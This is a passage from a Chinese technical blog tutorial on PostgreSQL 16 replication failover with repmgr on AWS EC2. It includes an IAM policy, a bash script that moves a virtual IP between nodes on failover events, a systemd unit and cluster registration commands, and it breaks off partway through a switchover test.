 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这个步骤理论上是不需要做的，但是有时候有问题，建议执行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$&amp;gt; touch /var/run/postgresql/repmgrd.pid &amp;amp;&amp;amp; chown postgres:postgres /var/run/postgresql/repmgrd.pid
$&amp;gt; mkdir /var/log/repmgr &amp;amp;&amp;amp; chown postgres:postgres /var/log/repmgr&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="创建-vip-漂移管理脚本及亚马逊权限管理"&gt;&lt;span&gt;创建 VIP 漂移管理脚本及亚马逊权限管理&lt;/span&gt;
 &lt;a href="#%e5%88%9b%e5%bb%ba-vip-%e6%bc%82%e7%a7%bb%e7%ae%a1%e7%90%86%e8%84%9a%e6%9c%ac%e5%8f%8a%e4%ba%9a%e9%a9%ac%e9%80%8a%e6%9d%83%e9%99%90%e7%ae%a1%e7%90%86" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;亚马逊 创建 &lt;code&gt;IAM Policy&lt;/code&gt; 并附加到两台 &lt;code&gt;EC2&lt;/code&gt; 的实例角色&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建权限策略 &lt;code&gt;PostgresVipFailoverPolicy&lt;/code&gt;
&lt;pre&gt;&lt;code&gt;{
 &amp;#34;Version&amp;#34;: &amp;#34;2012-10-17&amp;#34;,
 &amp;#34;Statement&amp;#34;: [
 {
 &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;,
 &amp;#34;Action&amp;#34;: [
 &amp;#34;ec2:DescribeInstances&amp;#34;,
 &amp;#34;ec2:DescribeNetworkInterfaces&amp;#34;,
 &amp;#34;ec2:AssignPrivateIpAddresses&amp;#34;,
 &amp;#34;ec2:UnassignPrivateIpAddresses&amp;#34;
 ],
 &amp;#34;Resource&amp;#34;: &amp;#34;*&amp;#34;
 }
 ]
}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;创建一个&lt;code&gt;IMA角色&lt;/code&gt;， 点击 &lt;code&gt;角色&lt;/code&gt;-&lt;code&gt;创建角色&lt;/code&gt;-&lt;code&gt;可信实体(AWS服务)&lt;/code&gt;-&lt;code&gt;使用案例(EC2)&lt;/code&gt;， 下一步， 权限策略选择 &lt;code&gt;PostgresVipFailoverPolicy&lt;/code&gt;， 下一步，输入角色名称 &lt;code&gt;PostgresVipFailoverPolicy&lt;/code&gt;， 下一步，完成创建, 创建完成后，在&lt;code&gt;EC2&lt;/code&gt;找到对应的机器，将&lt;code&gt;IMA角色&lt;/code&gt;附加上去即可。(&lt;em&gt;&lt;strong&gt;IMA角色的附加可以防止在服务器上面配置ak/sk，也可以使用aws cli的调用，大大降低ak/sk泄露风险&lt;/strong&gt;&lt;/em&gt;)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/usr/local/bin/vip_failover_switch.sh&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$&amp;gt; touch /usr/local/bin/vip_failover_switch.sh &amp;amp;&amp;amp; chmod &amp;#43;x /usr/local/bin/vip_failover_switch.sh
# 脚本目前处于试运行阶段，事件处理可能还不太完善，后续遇到问题在修改
$&amp;gt; vim /usr/local/bin/vip_failover_switch.sh
#!/usr/bin/env bash
################################################# 
# author 0x5c0f
# date 2025-08-28 
# email mail@0x5c0f.cc 
# web tools.0x5c0f.cc 
# version 1.2.5
# last update 2025-08-28
# descript Use : ./vip_failover_switch.sh -h
################################################# 
set -euo pipefail

PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH

# sudoer 授权
# postgres ALL = NOPASSWD: /usr/sbin/ip addr add * dev *, /usr/sbin/ip addr del * dev *

########################################
# 配置区（按需修改）
########################################
declare -r PG_VIP=&amp;#34;10.0.1.100&amp;#34; # VIP 地址（不带掩码）
declare -Ar AWS_CLI_PROFILE_MAP_INSTANCE=( # 本机私有IP -&amp;gt; 该节点对应的 instance-id
 [&amp;#34;10.0.3.114&amp;#34;]=&amp;#34;{{ EC2_INSTANCE_ID }}&amp;#34;
 [&amp;#34;10.0.2.113&amp;#34;]=&amp;#34;{{ EC2_INSTANCE_ID }}&amp;#34;
)
declare -r NICNAME=&amp;#34;ens5&amp;#34; # 本地网卡名
declare -r DEVICE_INDEX=&amp;#34;0&amp;#34; # ENI 上的 device-index（通常0）
declare -r LOG_FILE=&amp;#34;/var/log/repmgr/vip_failover_switch.log&amp;#34;
declare -r AWS_RETRY=3 # AWS API 重试次数
declare -r AWS_RETRY_SLEEP=2 # 重试间隔(s)

########################################
# 日志函数
########################################
__SAY__() {
 local -- LOG_LEVEL=&amp;#34;${LOG_LEVEL:-DEBUG}&amp;#34;
 local -r ENDCOLOR=&amp;#34;\033[0m&amp;#34;
 local -r INFOCOLOR=&amp;#34;\033[1;34m&amp;#34;
 local -r SUCCESSCOLOR=&amp;#34;\033[0;32m&amp;#34;
 local -r ERRORCOLOR=&amp;#34;\033[0;31m&amp;#34;
 local -r WARNCOLOR=&amp;#34;\033[0;33m&amp;#34;
 local -r DEBUGCOLOR=&amp;#34;\033[0;35m&amp;#34;
 local LOGTYPE

 # 是否传入等级标记
 if [ -n &amp;#34;${1:-}&amp;#34; ] &amp;amp;&amp;amp; [[ &amp;#34;${1}&amp;#34; =~ ^[A-Za-z]&amp;#43;$ ]]; then
 if [ &amp;#34;${LOG_LEVEL^^}&amp;#34; == &amp;#34;INFO&amp;#34; ]; then
 if [ &amp;#34;${1^^}&amp;#34; == &amp;#34;DEBUG&amp;#34; -o &amp;#34;${1^^}&amp;#34; == &amp;#34;ERROR&amp;#34; -o &amp;#34;${1^^}&amp;#34; == &amp;#34;WARN&amp;#34; ]; then
 return 0
 fi
 elif [ &amp;#34;${LOG_LEVEL^^}&amp;#34; == &amp;#34;WARN&amp;#34; ]; then
 if [ &amp;#34;${1^^}&amp;#34; == &amp;#34;DEBUG&amp;#34; -o &amp;#34;${1^^}&amp;#34; == &amp;#34;ERROR&amp;#34; ]; then
 return 0
 fi
 elif [ &amp;#34;${LOG_LEVEL^^}&amp;#34; == &amp;#34;ERROR&amp;#34; ]; then
 if [ &amp;#34;${1^^}&amp;#34; == &amp;#34;DEBUG&amp;#34; ]; then
 return 0
 fi
 fi

 LOGTYPE=&amp;#34;${1^^}COLOR&amp;#34;
 if [ -z &amp;#34;${!LOGTYPE:-}&amp;#34; ]; then
 LOGTYPE=&amp;#34;INFOCOLOR&amp;#34;
 else
 shift
 fi
 else
 LOGTYPE=&amp;#34;INFOCOLOR&amp;#34;
 fi

 local MESSAGE=&amp;#34;$*&amp;#34;
 echo -e &amp;#34;[$(date &amp;#39;&amp;#43;%Y-%m-%d_%H:%M:%S&amp;#39;)] [${!LOGTYPE}${LOGTYPE%%COLOR}${ENDCOLOR}] ${MESSAGE}&amp;#34; | tee -a &amp;#34;${LOG_FILE}&amp;#34;
}

# 获取网卡上的私有IP（不带掩码）
function _GET_PRIVATE_IP() {
 sudo /usr/sbin/ip -4 addr show &amp;#34;${NICNAME}&amp;#34; 2&amp;gt;/dev/null | grep -oP &amp;#39;inet \K[\d.]&amp;#43;&amp;#39; | head -1 || true
}

# 获取本实例ID（通过私有 IP 映射）
function _GET_INSTANCE_ID() {
 local _PRIVATE_IP_=$(_GET_PRIVATE_IP)
 if [ -z &amp;#34;${_PRIVATE_IP_}&amp;#34; ]; then
 __SAY__ error &amp;#34;无法从本机获取私有IP（NIC=${NICNAME}），请检查网卡名&amp;#34;
 return 1
 fi
 echo &amp;#34;${AWS_CLI_PROFILE_MAP_INSTANCE[${_PRIVATE_IP_}]:-}&amp;#34;
}

# 获取当前实例所用 ENI ID
function _GET_ENI_ID() {
 local inst
 inst=$(_GET_INSTANCE_ID) || return 1
 if [ -z &amp;#34;${inst}&amp;#34; ]; then
 __SAY__ error &amp;#34;未为本机私有IP配置 InstanceID 映射&amp;#34;
 return 1
 fi
 aws ec2 describe-network-interfaces \
 --filters &amp;#34;Name=attachment.instance-id,Values=${inst}&amp;#34; &amp;#34;Name=attachment.device-index,Values=${DEVICE_INDEX}&amp;#34; \
 --query &amp;#39;NetworkInterfaces[].NetworkInterfaceId&amp;#39; --output text
}

# 从本地网卡获取掩码位长度（例如 20）
function _GET_LOCAL_MASK() {
 sudo /usr/sbin/ip -o -f inet addr show &amp;#34;${NICNAME}&amp;#34; 2&amp;gt;/dev/null | awk &amp;#39;{print $4}&amp;#39; | head -1 | cut -d/ -f2 || echo &amp;#34;20&amp;#34;
}

# 判断本机系统层是否已经存在该 VIP（返回 0 表示存在）
function _SYSTEM_HAS_VIP() {
 local mask
 mask=$(_GET_LOCAL_MASK)
 if sudo /usr/sbin/ip addr show dev &amp;#34;${NICNAME}&amp;#34; 2&amp;gt;/dev/null | grep -q &amp;#34;${PG_VIP}/${mask}&amp;#34;; then
 return 0
 fi
 # 兼容没有掩码直接匹配
 if sudo /usr/sbin/ip addr show dev &amp;#34;${NICNAME}&amp;#34; 2&amp;gt;/dev/null | grep -q &amp;#34;${PG_VIP}&amp;#34;; then
 return 0
 fi
 return 1
}

function ADD_VIP() {
 local _ENI_ID_ _mask _i _found _aws_output
 _ENI_ID_=$(_GET_ENI_ID) || { __SAY__ error &amp;#34;无法获取 ENI ID&amp;#34;; return 1; }

 # 检查特定的 ENI 上是否绑定了特定的 VIP
 __SAY__ debug &amp;#34;检查特定ENI上是否已经绑定了VIP: aws ec2 describe-network-interfaces --network-interface-ids ${_ENI_ID_} --query \&amp;#34;NetworkInterfaces[].PrivateIpAddresses[?PrivateIpAddress==&amp;#39;${PG_VIP}&amp;#39;].PrivateIpAddress\&amp;#34; --output text&amp;#34;

 _found=$(aws ec2 describe-network-interfaces --network-interface-ids &amp;#34;${_ENI_ID_}&amp;#34; --query &amp;#34;NetworkInterfaces[].PrivateIpAddresses[?PrivateIpAddress==&amp;#39;${PG_VIP}&amp;#39;].PrivateIpAddress&amp;#34; --output text 2&amp;gt;/dev/null || true)

 if [ &amp;#34;${_found}&amp;#34; == &amp;#34;${PG_VIP}&amp;#34; ]; then
 __SAY__ warn &amp;#34;AWS: ENI ${_ENI_ID_} 已存在 VIP ${PG_VIP}，跳过分配&amp;#34;
 else
 __SAY__ info &amp;#34;开始添加 VIP ${PG_VIP} 到 ENI ${_ENI_ID_}&amp;#34;

 __SAY__ debug &amp;#34;aws ec2 assign-private-ip-addresses --network-interface-id ${_ENI_ID_} --private-ip-addresses ${PG_VIP} --allow-reassignment&amp;#34;
 for _i in $(seq 1 ${AWS_RETRY}); do
 _aws_output=$(aws ec2 assign-private-ip-addresses --network-interface-id &amp;#34;${_ENI_ID_}&amp;#34; --private-ip-addresses &amp;#34;${PG_VIP}&amp;#34; --allow-reassignment)

 if [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;#34;${_aws_output}&amp;#34; | jq -e &amp;#34;.AssignedPrivateIpAddresses[] | select(.PrivateIpAddress==\&amp;#34;${PG_VIP}\&amp;#34;)&amp;#34; &amp;gt; /dev/null; then
 __SAY__ success &amp;#34;AWS: 成功为 ENI ${_ENI_ID_} 分配 VIP ${PG_VIP}&amp;#34;
 __SAY__ debug &amp;#34;AWS Rsp: ${_aws_output}&amp;#34;
 break
 else
 __SAY__ warn &amp;#34;AWS: 为 ENI ${_ENI_ID_} 分配 VIP ${PG_VIP} 第 ${_i} 次失败，重试...&amp;#34;
 __SAY__ debug &amp;#34;AWS Rsp: ${_aws_output}&amp;#34;
 sleep ${AWS_RETRY_SLEEP}
 fi

 if [ &amp;#34;${_i}&amp;#34; -eq &amp;#34;${AWS_RETRY}&amp;#34; ]; then
 __SAY__ error &amp;#34;AWS: 多次尝试分配 VIP 失败，放弃操作&amp;#34;
 return 1
 fi
 done
 fi

 # 等待几秒让 AWS 侧生效
 sleep 2

 if _SYSTEM_HAS_VIP; then
 __SAY__ warn &amp;#34;系统网卡 ${NICNAME} 已存在 VIP ${PG_VIP}，跳过本地添加&amp;#34;
 else
 _mask=$(_GET_LOCAL_MASK)
 __SAY__ debug &amp;#34;sudo /usr/sbin/ip addr add ${PG_VIP}/${_mask} dev ${NICNAME}&amp;#34;
 if sudo /usr/sbin/ip addr add &amp;#34;${PG_VIP}/${_mask}&amp;#34; dev &amp;#34;${NICNAME}&amp;#34;; then
 __SAY__ success &amp;#34;系统: VIP ${PG_VIP}/${_mask} 已添加到 ${NICNAME}&amp;#34;
 else
 __SAY__ error &amp;#34;系统: 添加 VIP ${PG_VIP}/${_mask} 到 ${NICNAME} 失败&amp;#34;
 return 1
 fi
 fi

 return 0
}

function DEL_VIP() {
 local _ENI_ID_ _mask _found
 _ENI_ID_=$(_GET_ENI_ID) || { __SAY__ error &amp;#34;无法获取 ENI ID&amp;#34;; return 1; }

 __SAY__ info &amp;#34;开始从 ENI ${_ENI_ID_} / 本地网卡 ${NICNAME} 删除 VIP ${PG_VIP}&amp;#34;

 # _found=$(aws ec2 describe-network-interfaces --network-interface-ids &amp;#34;${_ENI_ID_}&amp;#34; \
 # --query &amp;#34;NetworkInterfaces[].PrivateIpAddresses[?PrivateIpAddress==&amp;#39;${PG_VIP}&amp;#39;] | [0].PrivateIpAddress&amp;#34; --output text 2&amp;gt;/dev/null || true)
 # if [ &amp;#34;${_found}&amp;#34; == &amp;#34;${PG_VIP}&amp;#34; ]; then
 # if aws ec2 unassign-private-ip-addresses --network-interface-id &amp;#34;${_ENI_ID_}&amp;#34; --private-ip-addresses &amp;#34;${PG_VIP}&amp;#34;; then
 # __SAY__ success &amp;#34;AWS: 成功从 ENI ${_ENI_ID_} 解绑 VIP ${PG_VIP}&amp;#34;
 # else
 # __SAY__ warn &amp;#34;AWS: 解绑 VIP ${PG_VIP} 失败或已被 reassigned，继续进行本地清理&amp;#34;
 # fi
 # else
 # __SAY__ debug &amp;#34;AWS: ENI ${_ENI_ID_} 未绑定 VIP ${PG_VIP}，跳过 unassign&amp;#34;
 # fi

 # 系统层：删除本地 IP
 if _SYSTEM_HAS_VIP; then
 _mask=$(_GET_LOCAL_MASK)
 __SAY__ debug &amp;#34;sudo /usr/sbin/ip addr del ${PG_VIP}/${_mask} dev ${NICNAME}&amp;#34;
 if sudo /usr/sbin/ip addr del &amp;#34;${PG_VIP}/${_mask}&amp;#34; dev &amp;#34;${NICNAME}&amp;#34;; then
 __SAY__ success &amp;#34;系统: VIP ${PG_VIP}/${_mask} 已从 ${NICNAME} 删除&amp;#34;
 else
 __SAY__ warn &amp;#34;系统: 删除 VIP ${PG_VIP}/${_mask} 失败（可能掩码不同），尝试模糊删除&amp;#34;
 # 最后尝试强匹配删除（不推荐，但兜底）
 if sudo /usr/sbin/ip addr show dev &amp;#34;${NICNAME}&amp;#34; | grep -q &amp;#34;${PG_VIP}&amp;#34;; then
 # 查找确切 cidr 并删除
 local found_cidr
 found_cidr=$(sudo /usr/sbin/ip -o -f inet addr show &amp;#34;${NICNAME}&amp;#34; | awk -v vip=&amp;#34;${PG_VIP}&amp;#34; &amp;#39;$0~vip {print $4; exit}&amp;#39;)
 if [ -n &amp;#34;${found_cidr}&amp;#34; ]; then
 sudo /usr/sbin/ip addr del &amp;#34;${found_cidr}&amp;#34; dev &amp;#34;${NICNAME}&amp;#34; || __SAY__ error &amp;#34;系统: 最后兜底删除失败&amp;#34;
 __SAY__ success &amp;#34;系统: 使用 ${found_cidr} 删除 VIP ${PG_VIP}&amp;#34;
 fi
 fi
 fi
 else
 __SAY__ warn &amp;#34;系统网卡 ${NICNAME} 不存在 VIP ${PG_VIP}，跳过本地删除&amp;#34;
 fi

 return 0
}

########################################
# main: 参数解析（来自 repmgr event_notification_command）
# usage: script NODE_ID EVENT_TYPE SUCCESS [TIMESTAMP] [DETAILS]
########################################
if [ &amp;#34;$#&amp;#34; -lt 3 ]; then
 __SAY__ warn &amp;#34;用法: $0 &amp;lt;NODE_ID&amp;gt; &amp;lt;EVENT_TYPE&amp;gt; &amp;lt;SUCCESS&amp;gt; [TIMESTAMP] [DETAILS]&amp;#34;
 __SAY__ warn &amp;#34;应当在 repmgr.conf 中配置: &amp;#34;
 __SAY__ warn &amp;#34;\tevent_notification_command = &amp;#39;sudo $0 %n %e %s %t \&amp;#34;%d\&amp;#34;&amp;#39;&amp;#34;
 __SAY__ warn &amp;#34;\tchild_nodes_disconnect_command=&amp;#39;sudo $0 %n child_nodes_disconnect_command 1 %t \&amp;#34;%d\&amp;#34;&amp;#39;&amp;#34;
 exit 1
fi

declare -- NODE_ID=&amp;#34;${1}&amp;#34;
declare -- EVENT_TYPE=&amp;#34;${2}&amp;#34;
declare -- SUCCESS=&amp;#34;${3}&amp;#34;
declare -- TIMESTAMP=&amp;#34;${4:-$(date &amp;#39;&amp;#43;%Y-%m-%d %H:%M:%S&amp;#39;)}&amp;#34;
declare -- DETAILS=&amp;#34;${5:-}&amp;#34;

__SAY__ debug &amp;#34;触发 repmgr 事件: NODE_ID=${NODE_ID} EVENT_TYPE=${EVENT_TYPE} SUCCESS=${SUCCESS} TIMESTAMP=${TIMESTAMP} DETAILS=${DETAILS}&amp;#34;

# 仅对成功事件执行操作（SUCCESS=1）
if [[ &amp;#34;${SUCCESS}&amp;#34; != &amp;#34;1&amp;#34; ]]; then
 __SAY__ warn &amp;#34;事件未成功（SUCCESS=${SUCCESS}），仅记录日志，跳过 VIP 操作&amp;#34;
 exit 0
fi

# 事件 -&amp;gt; 行为映射
case &amp;#34;${EVENT_TYPE}&amp;#34; in
 # 新主就位（挂 VIP）
 &amp;#34;standby_promote&amp;#34;|&amp;#34;repmgrd_failover_promote&amp;#34;|&amp;#34;standby_switchover&amp;#34;|&amp;#34;primary_register&amp;#34;)
 __SAY__ info &amp;#34;事件 ${EVENT_TYPE} 表示本节点为主，尝试挂载 VIP（DETAILS=${DETAILS})&amp;#34;
 if ADD_VIP; then
 __SAY__ success &amp;#34;ADD_VIP 操作完成（事件=${EVENT_TYPE}）&amp;#34;
 else
 __SAY__ error &amp;#34;ADD_VIP 操作失败（事件=${EVENT_TYPE}），请手动检查&amp;#34;
 exit 1
 fi
 ;;

 # 节点不再为主或需要自我隔离（摘 VIP）
 &amp;#34;standby_follow&amp;#34;|&amp;#34;primary_unregister&amp;#34;|&amp;#34;standby_register&amp;#34;)
 # &amp;#34;repmgrd_local_disconnect&amp;#34; 事件在主节点临时关闭时也会触发，这个时候不应删除 VIP
 # &amp;#34;child_nodes_disconnect_command&amp;#34; 事件在单主单备情况下也不应删除 VIP
 __SAY__ warn &amp;#34;事件 ${EVENT_TYPE} 表示本节点不应持有 VIP，尝试删除 VIP（DETAILS=${DETAILS})&amp;#34;
 if DEL_VIP; then
 __SAY__ success &amp;#34;DEL_VIP 操作完成（事件=${EVENT_TYPE}）&amp;#34;
 else
 __SAY__ error &amp;#34;DEL_VIP 操作失败（事件=${EVENT_TYPE}），请手动检查&amp;#34;
 exit 1
 fi
 ;;

 # 这些事件只记录告警/信息，不做 VIP 操作（防止脑裂）
 &amp;#34;repmgrd_upstream_disconnect&amp;#34;|&amp;#34;standby_disconnect_manual&amp;#34;|&amp;#34;standby_failure&amp;#34;|&amp;#34;standby_recovery&amp;#34;|&amp;#34;repmgrd_promote_error&amp;#34;)
 __SAY__ warn &amp;#34;事件 ${EVENT_TYPE} 仅为连接/错误类通知，记录日志并跳过 VIP 操作（DETAILS=${DETAILS})&amp;#34;
 ;;

 *)
 __SAY__ debug &amp;#34;未被脚本处理的事件: ${EVENT_TYPE}（DETAILS=${DETAILS}），仅记录&amp;#34;
 ;;
esac

exit 0&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="配置repmgrd服务"&gt;&lt;span&gt;配置repmgrd服务&lt;/span&gt;
 &lt;a href="#%e9%85%8d%e7%bd%aerepmgrd%e6%9c%8d%e5%8a%a1" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;默认安装 &lt;code&gt;postgresql-16-repmgr&lt;/code&gt; 后会创建一个 &lt;code&gt;/etc/init.d/repmgrd&lt;/code&gt; 用于管理 &lt;code&gt;repmgrd&lt;/code&gt;服务, 但这个脚本似乎有很严重的兼容问题，这里直接删除后重建服务
&lt;pre&gt;&lt;code&gt;# 在主从节点均执行
$&amp;gt; rm -rf /etc/init.d/repmgrd
$&amp;gt; systemctl daemon-reload
$&amp;gt; vim /etc/systemd/system/repmgrd.service
[Unit]
Description=PostgreSQL Replication Manager Daemon
After=postgresql@16-main.service

[Service]
Type=simple
User=postgres
Group=postgres
PIDFile=/var/run/postgresql/repmgrd.pid
ExecStart=/usr/bin/repmgrd -f /etc/repmgr.conf -d
ExecReload=/bin/kill -HUP $MAINPID
KillMode=process
PrivateTmp=true

[Install]
WantedBy=multi-user.target

$&amp;gt; systemctl daemon-reload
## 配置完成后，先不要启动该服务 &lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;配置 &lt;code&gt;/etc/postgresql/16/main/pg_hba.conf&lt;/code&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/postgresql/16/main/pg_hba.conf
# repmgr 连接权限
host repmgr repmgr 10.0.0.0/16 scram-sha-256
host replication repmgr 10.0.0.0/16 scram-sha-256&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="注册及校验"&gt;&lt;span&gt;注册及校验&lt;/span&gt;
 &lt;a href="#%e6%b3%a8%e5%86%8c%e5%8f%8a%e6%a0%a1%e9%aa%8c" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 主节点-pgsql_node_01(10.0.2.113)执行注册
$&amp;gt; sudo -u postgres repmgr primary register -f /etc/repmgr.conf

# 检查注册是否成功
$&amp;gt; sudo -u postgres repmgr cluster show -f /etc/repmgr.conf

# 从库注册前需要先配置application_name , 该值和当前节点 /etc/repmgrd.conf 中的 node_name 保持一致
# 从库执行修改
$&amp;gt; vim /data/_pgsql_data/16/main/postgresql.auto.conf
# 由于初次配置是通过 sudo -u postgres pg_basebackup -h 10.0.2.113 -U repl -D /data/_pgsql_data/16/main -Fp -Xs -P -R 基准复制拷贝的
# 所以直接在primary_conninfo 配置末尾添加 applicatoin_name=pgsql_node_02 即可
# 应该也可以直接删除原有的，直接配置 primary_conninfo = &amp;#39;host=10.0.2.113 port=5432 user=repmgr application_name=pgsql_node_02 password={{ REPMGR_PASSWORD }} connect_timeout=2&amp;#39;
# 调整完成后, 重载配置
$&amp;gt; sudo systemctl reload postgresql@16-main.service
# 查看配置是否成功
$&amp;gt; sudo -u postgres psql -c &amp;#34;SHOW primary_conninfo;&amp;#34;
# 在从节点上执行注册--upstream-node-id 指定的是上游节点，也就是主节点配置的node_id
$&amp;gt; sudo -u postgres repmgr standby register -f /etc/repmgr.conf --upstream-node-id=1

#########
## 主从节点启动 repmgrd 服务
$&amp;gt; sudo systemctl start repmgrd
#########

# 查看集群状态
# 查看完整的集群状态
$&amp;gt; sudo -u postgres repmgr cluster show -f /etc/repmgr.conf

# 查看所有节点的详细信息
$&amp;gt; sudo -u postgres repmgr cluster event --event=register -f /etc/repmgr.conf
# 在主节点上检查复制状态
$&amp;gt; sudo -u postgres psql -c &amp;#34;SELECT * FROM pg_stat_replication;&amp;#34;

# 在从节点上检查复制状态
$&amp;gt; sudo -u postgres psql -c &amp;#34;SELECT * FROM pg_stat_wal_receiver;&amp;#34;

# 检查repmgr.nodes表
$&amp;gt; sudo -u postgres psql -d repmgr -c &amp;#34;SELECT * FROM repmgr.nodes;&amp;#34;

# 查看节点状态
$&amp;gt; sudo -u postgres repmgr node status
# 查询当前备库从主库接收WAL日志流的状态
$&amp;gt; sudo -u postgres psql -c &amp;#34;SELECT * FROM pg_stat_wal_receiver;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="主从切换测试"&gt;&lt;span&gt;主从切换测试&lt;/span&gt;
 &lt;a href="#%e4%b8%bb%e4%bb%8e%e5%88%87%e6%8d%a2%e6%b5%8b%e8%af%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;非重建模式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 主节点-pgsql_node_01(10.0.2.113)执行
$&amp;gt; sudo systemctl stop postgresql@16-main.service
# 等待 1-2 分钟

# 验证集群状态，只有在 Status 为 - failed 时候， 从节点才会触发晋升从而变为主节点
